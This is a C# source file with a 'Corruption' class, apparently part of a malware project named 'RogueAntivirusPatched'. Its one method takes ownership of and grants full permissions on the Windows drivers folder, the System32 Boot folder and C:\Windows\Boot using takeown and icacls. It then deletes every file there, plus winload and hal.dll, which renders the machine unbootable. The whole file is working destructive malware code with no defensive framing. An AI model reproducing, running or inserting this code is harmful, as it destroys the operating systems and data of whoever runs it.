using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static CommandPrompt.CMD;

namespace RogueAntivirusPatched.Classes
{
    internal class Corruption
    {
        private string bypassWOW64 = @"C:\Windows\Sysnative";
        private string commonSystem32 = @"C:\Windows\System32";

        public void QuickCorruption()
        {
            string systemDir = bypassWOW64;

            if (!Directory.Exists(systemDir))
                systemDir = commonSystem32;

            string drivers = Path.Combine(systemDir, "drivers");

            var getDrivers = Directory.GetFiles(drivers, "*.*", SearchOption.AllDirectories);

            Command("takeown /f " + drivers + " /r /d Y");
            Command("icacls " + drivers + @" /grant ""%username%:F"" /t /c /q");

            foreach (var driver in getDrivers)
            {
                try
                {
                    File.Delete(driver);
                }
                catch { }
            }

            string[] getSys32Files = Directory.GetFiles(systemDir);

            foreach (var file in getSys32Files)
            {
                if (file.Contains("winload") || file.Contains("hal.dll"))
                {
                    Command("takeown /f " + file);
                    Command("icacls " + file + @" /grant ""%username%:F"" /c /q");

                    try
                    {
                        File.Delete(file);
                    }
                    catch { }
                }
            }

            string sys32BootDir = Path.Combine(systemDir, "Boot");
            string[] getBootFiles = Directory.GetFiles(sys32BootDir, "*.*", SearchOption.AllDirectories);

            Command("takeown /f " + sys32BootDir + " /r /d Y");
            Command("icacls " + sys32BootDir + @" /grant ""%username%:F"" /t /c /q");

            foreach (var file in getBootFiles)
            {
                try
                {
                    File.Delete(file);
                }
                catch { }
            }

            string winBootDir = @"C:\Windows\Boot";
            string[] getWinBootFiles = Directory.GetFiles(winBootDir, "*.*", SearchOption.AllDirectories);

            Command("takeown /f " + winBootDir + " /r /d Y");
            Command("icacls " + winBootDir + @" /grant ""%username%:F"" /t /c /q");

            foreach (var file in getWinBootFiles)
            {
                try
                {
                    File.Delete(file);
                }
                catch { }
            }
        }
    }
}
